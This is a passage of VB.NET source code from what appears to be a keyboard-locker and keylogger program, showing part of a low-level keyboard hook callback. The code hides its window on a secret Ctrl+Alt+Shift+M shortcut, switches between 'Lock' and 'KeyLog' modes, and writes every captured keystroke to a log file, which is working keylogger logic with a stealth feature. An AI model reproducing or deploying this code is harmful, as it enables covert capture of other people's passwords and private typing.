                        HideMe = False
                        Return CType(1, IntPtr)
                    ElseIf objKeyInfo.key = Keys.M And My.Computer.Keyboard.CtrlKeyDown And My.Computer.Keyboard.AltKeyDown And My.Computer.Keyboard.ShiftKeyDown Then
                        Me.WindowState = FormWindowState.Minimized
                        Me.Hide()
                        HideMe = True
                        Return CType(1, IntPtr)
                    End If
                End If

                ' Switch if Not Hidden
                If Not HideMe Then
                    ' Switch Status
                    If objKeyInfo.key = Keys.F7 And My.Computer.Keyboard.CtrlKeyDown And My.Computer.Keyboard.AltKeyDown And My.Computer.Keyboard.ShiftKeyDown Then
                        Try
                            CurrentStatus = "Lock" ' Switch to Lock
                        Catch ex As Exception
                            addError("Switch to Locker Shortcut Error : F7", ex.ToString)
                        End Try
                        Return CType(1, IntPtr)
                    ElseIf objKeyInfo.key = Keys.F6 And My.Computer.Keyboard.CtrlKeyDown And My.Computer.Keyboard.AltKeyDown And My.Computer.Keyboard.ShiftKeyDown Then
                        Try
                            CurrentStatus = "KeyLog" ' Switch to Lock
                        Catch ex As Exception
                            addError("Switch to KeyLog Shortcut Error : F6", ex.ToString)
                        End Try
                        Return CType(1, IntPtr)
                    End If
                End If

                ' Log Key Press
                keyStroke.AppendText(vbNewLine + vbNewLine + Feed(objKeyInfo.key).ToString)
                Try : File.AppendAllText(LogKeyPressx, Feed(objKeyInfo.key).ToString + vbNewLine) : Catch ex As Exception : End Try

            End If
            Return CallNextHookEx(ptrHook, nCode, wp, lp)
        Catch ex As Exception
            addError("Function Shortcut Keys Error", ex.ToString)
        End Try
    End Function
#End Region


End Class